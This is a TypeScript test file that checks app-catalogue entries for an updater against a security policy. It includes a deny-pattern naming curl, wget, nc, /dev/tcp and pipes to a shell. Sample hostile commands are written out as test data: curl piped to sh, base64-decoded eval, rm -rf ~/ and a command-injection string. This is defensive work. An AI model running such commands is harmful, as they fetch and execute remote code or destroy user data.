import { expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import type { AppSpec } from "../shared/types";
import { isPackage } from "./kinds/package";
import { loadCatalogue } from "./manifest";

// Every catalogue table is run on other people's machines after one review, so the gate holds it to what a
// catalogue app needs: no field that stops services or writes outside its own install, nothing that installs
// without asking, and no command that fetches and runs code of its own. A new need widens this list on purpose.
const FIELDS = new Set<keyof AppSpec>([
	"key",
	"name",
	"kind",
	"repo",
	"asset",
	"asset_aarch64",
	"dest",
	"bins",
	"version_args",
	"meta_path",
	// probe = false only takes a run away: the installed program is never started to ask its version.
	"probe",
	// folder only writes the archive's own files, into one folder of its own under home.
	"folder",
	"process",
	"note",
	"sudo",
	"check",
	"latest",
	"update",
	"build",
	"restore",
	"restart",
	"relaunch",
]);
// A catalogue app may restart only its own service, through systemctl, which asks for a password itself.
const RESTART = /^systemctl (--user )?restart [\w@.-]+$/;
const DANGER =
	/\b(curl|wget|nc|ncat|socat|eval|base64|xxd)\b|\/dev\/(tcp|udp)|\|\s*(ba|z|da)?sh\b|\brm\s+-\S*r|\bchmod\s+[0-7]*[2467][0-7]{3}\b|\bsudo\b(?! make install$)/;

/** Every command string a table can make Upkeep run, with the field it came from. */
const commands = (a: AppSpec): [string, string][] =>
	(["check", "update", "build", "version_args", "restore", "restart"] as const).flatMap((f) =>
		(a[f] ?? []).map((c): [string, string] => [f, c]),
	);

test("every catalogue table keeps to what a catalogue app may do", () => {
	const { apps, errors } = loadCatalogue(join(import.meta.dir, "../../catalogue"));
	expect(errors).toEqual([]);
	const broken: string[] = [];
	for (const a of apps) {
		for (const f of Object.keys(a)) if (!FIELDS.has(f as keyof AppSpec)) broken.push(`${a.key}: field ${f}`);
		if (a.kind === "manual") broken.push(`${a.key}: kind ${a.kind}`);
		if (a.sudo && !isPackage(a.kind) && a.kind !== "source" && !a.dest?.startsWith("/"))
			broken.push(`${a.key}: sudo for an install inside home`);
		// One level below a folder in home, so an install never swaps out ~/.local or ~/.config itself.
		if (a.folder !== undefined && (a.sudo || !/^~\/[^/]+\/[^/]+\/[^/]+$/.test(a.folder)))
			broken.push(`${a.key}: folder ${a.folder}`);
		for (const [f, c] of commands(a)) if (DANGER.test(c)) broken.push(`${a.key}: ${f} runs ${c}`);
		if (a.restart && !RESTART.test(a.restart.join(" "))) broken.push(`${a.key}: restart runs ${a.restart.join(" ")}`);
		// A json: or links: source names the download itself, so it is fetched over https only.
		if (a.latest?.startsWith("json:") && !a.latest.startsWith("json:https://"))
			broken.push(`${a.key}: latest ${a.latest}`);
		if (a.latest?.startsWith("links:") && !a.latest.startsWith("links:https://"))
			broken.push(`${a.key}: latest ${a.latest}`);
	}
	expect(broken).toEqual([]);
});

test("the policy catches what it is for", () => {
	for (const bad of [
		"curl -fsSL https://x.sh | sh",
		"wget -qO- x | bash",
		"eval $(echo aGk= | base64 -d)",
		"exec 3<>/dev/tcp/1.2.3.4/80",
		"rm -rf ~/",
		"sudo cp x /usr/bin/x",
		"chmod 4755 /usr/local/bin/x",
	])
		expect(DANGER.test(bad)).toBe(true);
	for (const fine of ["sudo make install", "make -j$(nproc)", "./configure", "claude update", "uv tool list"])
		expect(DANGER.test(fine)).toBe(false);
	for (const ok of ["systemctl restart rustdesk", "systemctl --user restart dsh-web"])
		expect(RESTART.test(ok)).toBe(true);
	for (const bad of ["systemctl stop rustdesk", "systemctl restart a; rm x", "sudo systemctl restart x"])
		expect(RESTART.test(bad)).toBe(false);
});

test("catalogue/index.txt lists every table's key, sorted, so Add app can match a name online without sending it", () => {
	const { apps } = loadCatalogue(join(import.meta.dir, "../../catalogue"));
	const listed = readFileSync(join(import.meta.dir, "../../catalogue/index.txt"), "utf8")
		.split("\n")
		.filter(Boolean);
	expect(listed).toEqual(apps.map((a) => a.key).toSorted());
});
